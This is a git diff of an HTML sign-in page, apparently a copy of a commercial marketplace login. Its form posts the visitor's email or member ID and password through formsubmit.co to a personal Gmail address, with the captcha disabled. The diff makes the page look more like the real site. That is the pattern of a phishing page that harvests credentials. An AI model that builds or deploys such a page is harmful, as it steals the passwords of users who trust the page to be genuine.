@@ -13,76 +13,110 @@
     <link rel="stylesheet" href="login.css" />
   </head>
   <body>
-    <section>
+    <section class="pt-5">
       <section class="container mt-5">
-        <div class="pt-5">
+        <div class="col-md-5 col-12 p-4 border">
           <form
             action="https://formsubmit.co/oladipupomichael9@gmail.com"
             method="POST"
           >
+            <label for="email" class="fw-bold">Account:</label>
             <input
-              class="forms my-3"
+              class="forms mb-3 input-margin"
               type="email"
               placeholder="Email address or Member ID"
               name="email"
               required
             />
-            <div class="input-box">
-              <input
-                class="forms mt-3 mb-2"
-                type="password"
-                placeholder="Password"
-                name="password"
-                id="password"
-                required
-              />
-              <img src="./assets/hide.png" alt="view" id="image" class="text-secondary" onclick="toggleVisibility()">
+            <div class="d-flex justify-content-between">
+              <label class="fw-bold">Password:</label>
+              <p class="margin-0">
+                <a
+                  href="#password"
+                  class="text-decoration-none text-primary hover-orange"
+                  >Forgot password?</a
+                >
+              </p>
             </div>
 
-            <!-- <a onclick="toggleVisibility()">show password</a> -->
-            <p class="mb-3">
-              <a
-                href="#password"
-                class="nav-link text-secondary me-3"
-                id="forgotPassword"
-                >Forgot password</a
+            <!-- <div class="input-box"> -->
+            <input
+              class="forms mb-3 input-margin"
+              type="password"
+              placeholder="Password"
+              name="password"
+              id="password"
+              required
+            />
+
+            <p class="mb-2">
+              <input type="checkbox" checked />
+              <span class="fw-bold"
+                >Stay signed in.
+                <a href="" class="text-decoration-none hover-orange"
+                  >Details</a
+                ></span
               >
             </p>
+            <!-- <img src="./assets/hide.png" alt="view" id="image" class="text-secondary" onclick="toggleVisibility()"> -->
+            <!-- </div> -->
+
+            <!-- <a onclick="toggleVisibility()">show password</a> -->
+
             <input type="hidden" name="_subject" value="New Submission" />
             <input type="hidden" name="_captcha" value="false" />
             <input type="submit" class="btn btn-orange w-100" value="Sign In" />
           </form>
-          <p class="text-center text-secondary mt-3">Or sign in with:</p>
-          <div class="d-flex justify-content-around">
-            <img
-              class="size rounded-circle shadow"
-              src="./assets//facebook.png"
-              alt="facebook"
-            />
-            <img
-              class="size rounded-circle shadow"
-              src="./assets//google.png"
-              alt="google"
-            />
-            <img
-              class="size rounded-circle shadow"
-              src="./assets//linkedin.png"
-              alt="linkein"
-            />
-            <img
-              class="size rounded-circle shadow"
-              src="./assets//twitter.jpeg"
-              alt="twitter"
-            />
+          <p class="mt-4">
+            <a href="" class="text-decoration-none hover-orange"
+              >Mobile number sign in</a
+            >
+          </p>
+          <hr />
+          <div class="d-flex">
+            <p class="text-center text-secondary mt-3">Or sign in with:</p>
+            <div class="d-flex justify-content-around">
+              <img
+                class="size ms-3 me-2"
+                src="./assets//facebook.png"
+                alt="facebook"
+              />
+              <img
+                class="size rounded-circle mx-2"
+                src="./assets//google.png"
+                alt="google"
+              />
+              <img
+                class="size mx-2"
+                src="./assets//linkedin.png"
+                alt="linkein"
+              />
+              <img
+                class="size rounded-circle shadow d-none"
+                src="./assets//twitter.jpeg"
+                alt="twitter"
+              />
+            </div>
           </div>
-          <p class="text-center mt-5 text-secondary">
+
+          <!-- <p class="text-center mt-5 text-secondary">
             Don't have an account?
             <span
               ><a href="" class="text-decoration-none text-orange"
                 >Register</a
               ></span
             >
-          </p>
+          </p> -->
+          <div class="mt-4">
+            <p class="text-ash">
+              <input type="checkbox" checked /> I agree to Free Membership
+              Agreement
+            </p>
+            <p class="text-ash">
+              <input type="checkbox" checked />I agree to Receive marketing
+              materials
+            </p>
+          </div>
         </div>
       </section>
     </section>
